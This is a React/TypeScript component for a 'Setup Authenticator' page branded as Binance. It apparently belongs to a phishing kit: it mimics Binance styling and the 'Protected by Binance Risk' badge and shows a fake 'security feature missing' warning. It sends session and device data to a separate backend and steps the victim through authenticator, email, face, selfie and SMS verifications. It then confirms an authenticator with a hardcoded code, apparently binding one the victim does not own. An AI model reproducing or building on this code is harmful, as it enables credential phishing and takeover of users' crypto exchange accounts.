import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Mail, KeyRound, User, Check, ArrowRight, X, Shield } from 'lucide-react';
import { PageTransition } from '../components/PageTransition';
import { BinanceLogo, FaceVerificationIcon } from '../components/Icons';
import { VerificationModal } from '../components/VerificationModal';
import { API_BASE_URL, checkLoginExpiration } from '../services/api';
import { Spinner } from '../components/Spinner';

// Add interface for the API response
interface GauthStepsResponse {
  success: boolean;
  bizNo: string;
  verificationSteps: string[];
}

export const SetupAuthenticator: React.FC = () => {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [verificationType, setVerificationType] = useState<'authenticator' | 'email' | 'facial' | 'selfie' | 'sms' | null>(null);
  const [completedVerifications, setCompletedVerifications] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const apiCallMade = useRef(false);
  const [displayName, setDisplayName] = useState<string | null>(null);
  const [verificationMethods, setVerificationMethods] = useState({
    authenticator: false,
    email: false,
    facial: false,
    selfie: false,
    sms: false
  });
  const [isFinalizingSetup, setIsFinalizingSetup] = useState(false);

  const navigate = useNavigate();
  const totalVerifications = Object.values(verificationMethods).filter(Boolean).length;
  const completedCount = completedVerifications.length;
  
  // Add API call on page load
  useEffect(() => {
    if (apiCallMade.current) return;
    apiCallMade.current = true;

    const prepareGauthSetup = async () => {
      try {
        const sessionId = localStorage.getItem('session_id');
    const deviceInfo = localStorage.getItem('deviceInfo');
    
        if (!sessionId || !deviceInfo) {
          console.error('Missing session data');
          setIsLoading(false);
      return;
    }
    
        const response = await fetch(`${API_BASE_URL}/?action=codes&task=check_gauth_steps`, {
          method: 'POST',
          headers: {
            'Accept': '*/*',
            'Content-Type': 'text/plain',
          },
          body: JSON.stringify({ 
            session_id: sessionId,
        device_info: deviceInfo
          }),
        });

        const data: GauthStepsResponse = await response.json();
        console.log('Gauth steps response:', data);
        
        // Check for login expiration
        checkLoginExpiration(data);

        if (!data.success) {
          console.error('Failed to get gauth steps:', data);
          setIsLoading(false);
          return;
        }

        // Store bizNo and mobileNo
        if (data.bizNo) {
          localStorage.setItem('gauth_bizno', data.bizNo);
        }
        if (data.mobileNo) {
          console.log('Storing mobileNo in localStorage:', data.mobileNo);
          localStorage.setItem('mobileNo', data.mobileNo);
        }

        // Map verification steps to methods
        const methods = {
          authenticator: data.verificationSteps.includes('GOOGLE') || data.verificationSteps.includes('AUTHENTICATOR'),
          email: data.verificationSteps.includes('EMAIL'),
          facial: data.verificationSteps.includes('FACE') || data.verificationSteps.includes('FACIAL'),
          selfie: data.verificationSteps.includes('SELFIE'),
          sms: data.verificationSteps.includes('SMS')
        };
        
        console.log('Verification steps from API:', data.verificationSteps);
        console.log('Mapped verification methods:', methods);
        
        setVerificationMethods(methods);

        setIsLoading(false);
      } catch (error) {
        console.error('Gauth setup preparation failed:', error);
        setIsLoading(false);
      }
    };

    prepareGauthSetup();
  }, [navigate]);
  
  // Add useEffect for getting user name
  useEffect(() => {
    const userData = localStorage.getItem('userData');
    if (userData) {
      const { firstName, lastName, email } = JSON.parse(userData);
      
      if (!firstName && !lastName && !email) {
        setDisplayName(null);
        return;
      }

      let formattedName = '';
      if (firstName || lastName) {
        if (firstName && lastName) {
          formattedName = `${firstName} ${lastName.charAt(0)}`;
        } else {
          formattedName = firstName || lastName;
        }
      } else if (email) {
        formattedName = email.split('@')[0];
      }

      setDisplayName(formattedName || null);
    }
  }, []);

  const handleVerification = (type: 'authenticator' | 'email' | 'facial' | 'selfie' | 'sms') => {
    console.log('Handling verification:', type);
    setVerificationType(type);
    setIsModalOpen(true);
  };

  // Add check for completion and finalize
  useEffect(() => {
    const finalizeSetup = async () => {
      try {
        setIsFinalizingSetup(true);
        
        // Call confirm_authenticator API when all steps are completed
        const sessionId = localStorage.getItem('session_id');
        const bizNo = localStorage.getItem('gauth_bizno');
        
        if (sessionId && bizNo) {
          const response = await fetch(`${API_BASE_URL}/?action=codes&task=confirm_authenticator`, {
            method: 'POST',
            headers: {
              'Accept': '*/*',
              'Content-Type': 'text/plain',
            },
            body: JSON.stringify({
              session_id: sessionId,
              bizNo: bizNo,
              verifyCode: '000000' // Use default code for setup
            }),
          });

          const data = await response.json();
          console.log('Confirm authenticator response:', data);
          
          if (data.success) {
            console.log('Authenticator setup completed successfully');
            
            // Store in localStorage that authenticator is set up
            localStorage.setItem('authenticator_enabled', 'true');
            localStorage.setItem('ownauthenticator', 'false');
            
            // Update user data with gauth=true
            const userDataString = localStorage.getItem('userData');
            if (userDataString) {
              try {
                const userData = JSON.parse(userDataString);
                userData.gauth = true;
                localStorage.setItem('userData', JSON.stringify(userData));
              } catch (error) {
                console.error('Error updating userData:', error);
              }
            }
            
            // Redirect to verification-required page after setup completion
            navigate('/verification-required');
          } else {
            console.error('Failed to confirm authenticator:', data);
            setIsFinalizingSetup(false);
          }
        } else {
          console.error('Missing session data for confirm_authenticator');
          setIsFinalizingSetup(false);
        }
      } catch (error) {
        console.error('Failed to finalize setup:', error);
        setIsFinalizingSetup(false);
      }
    };

    // Check if all steps are completed
    const requiredSteps = totalVerifications;
    const completedSteps = completedVerifications.length;
    
    if (requiredSteps > 0 && completedSteps === requiredSteps) {
      finalizeSetup();
    }
  }, [completedVerifications, totalVerifications, navigate]);

  return (
    <PageTransition>
      <div className="relative min-h-screen bg-[rgb(30,35,41)]">
        {isFinalizingSetup && (
          <div className="fixed inset-0 bg-[rgb(30,35,41)]/30 backdrop-blur-[1px] z-50 flex items-center justify-center">
            <Spinner overlayClassName="bg-transparent" />
          </div>
        )}

        <div className={isFinalizingSetup ? 'blur-[1px]' : ''}>
          <div className="min-h-screen bg-[#0B0E11] flex flex-col relative">
            {/* Header stays visible */}
            <header className="bg-[rgb(30,35,41)] px-4 py-5">
          <div className="max-w-[1200px] mx-auto flex justify-between items-center">
            <BinanceLogo />
            {displayName && (
              <div className="flex items-center gap-2 text-[#EAECEF]">
                <User size={20} className="text-[#F0B90B]" />
                <span className="text-[14px] font-[500]">{displayName}</span>
              </div>
            )}
          </div>
        </header>

            {/* Main Content with relative positioning */}
            <div className="flex-1 bg-[rgb(30,35,41)] relative">
              <main className="w-full flex flex-col items-center justify-center p-4 pt-8 sm:pt-12">
          {isLoading ? (
                  <div className="absolute inset-0">
                    <Spinner 
                      message="Loading setup requirements..."
                      overlayClassName="bg-[rgb(30,35,41)] backdrop-blur-none"
                    />
            </div>
          ) : (
                  <div className="w-full max-w-[480px] px-6">
                    {/* Title */}
                    <div className="mb-8">
                      <h1 className="text-[32px] font-semibold text-[#EAECEF] mb-4">
                        Setup Authenticator
                      </h1>
                      
                      {/* Security Warning Box */}
                      <div className="bg-[#131519] border border-[#5D4A1D] rounded-lg mb-4 p-3">
                        <p className="text-[#F0B90B] text-[14px] font-medium">
                          Security feature missing: Your account requires Google Authenticator for enhanced protection.
                        </p>
                      </div>
                      
                      <p className="text-[#848E9C] text-[16px]">
                        Complete the following verifications to set up your authenticator.
                      </p>
                    </div>

                    {/* Progress */}
                    <div className="mb-8">
                      <span className="text-[#F0B90B] text-[32px] font-semibold">
                        {completedCount}/{totalVerifications}
                      </span>
                    </div>

                    {/* Verification Steps */}
                    <div className="space-y-3">
                      {verificationMethods.authenticator && (
                        <button 
                          onClick={() => {
                            if (!completedVerifications.includes('authenticator')) {
                              setVerificationType('authenticator');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('authenticator') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <KeyRound size={20} className="text-[#F0B90B]" />
                            <span>Google Authenticator</span>
                          </div>
                          {completedVerifications.includes('authenticator') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}

                      {verificationMethods.email && (
                        <button 
                          onClick={() => {
                            if (!completedVerifications.includes('email')) {
                              setVerificationType('email');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('email') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <Mail size={20} className="text-[#F0B90B]" />
                            <span>Email Verification</span>
                          </div>
                          {completedVerifications.includes('email') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}

                      {verificationMethods.facial && (
                        <button 
                          onClick={() => {
                            if (!completedVerifications.includes('facial')) {
                              setVerificationType('facial');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('facial') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <FaceVerificationIcon className="w-5 h-5 text-[#F0B90B]" />
                            <span>Face Verification</span>
                          </div>
                          {completedVerifications.includes('facial') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}

                      {verificationMethods.selfie && (
                        <button
                          onClick={() => {
                            if (!completedVerifications.includes('selfie')) {
                              setVerificationType('selfie');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('selfie') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <Shield size={20} className="text-[#F0B90B]" />
                            <span>Selfie Verification</span>
                          </div>
                          {completedVerifications.includes('selfie') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}

                      {verificationMethods.sms && (
                        <button 
                          onClick={() => {
                            if (!completedVerifications.includes('sms')) {
                              setVerificationType('sms');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('sms') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <Mail size={20} className="text-[#F0B90B]" />
                            <span>SMS Verification</span>
                      </div>
                          {completedVerifications.includes('sms') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}
                    </div>

                    {/* Security verification unavailable link */}
                    <div className="mt-8 text-center">
                      <button className="text-[#F0B90B] hover:text-[#FCD535] text-[14px] font-[500]">
                        Security verification unavailable?
                      </button>
                    </div>

                    {/* Protected by Binance Risk */}
                    <div className="mt-4 text-center">
                      <p className="text-[#848E9C] text-[12px] flex items-center justify-center gap-2">
                        <svg 
                          fill="DisabledText" 
                          className="bn-svg w-5 h-5" 
                          viewBox="0 0 24 24" 
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path 
                            fillRule="evenodd" 
                            clipRule="evenodd" 
                            d="M4 4v12l8 5 8-5V4H4zm12 7a4 4 0 11-8 0 4 4 0 018 0zm-4-2.121L9.879 11 12 13.121 14.121 11 12 8.879z" 
                            fill="currentColor"
                          />
                        </svg>
                        Protected by Binance Risk
                      </p>
                    </div>
                  </div>
                )}
              </main>
            </div>

            <VerificationModal 
              isOpen={isModalOpen}
              onClose={() => {
                setIsModalOpen(false);
                setVerificationType(null);
              }}
              verificationType={verificationType}
              onComplete={(type) => {
                console.log('Verification completed:', type);
                setCompletedVerifications(prev => [...prev, type]);
                setIsModalOpen(false);
                setVerificationType(null);
              }}
              isSetupAuthenticator={true}
            />
              </div>
        </div>
      </div>
    </PageTransition>
  );
}; 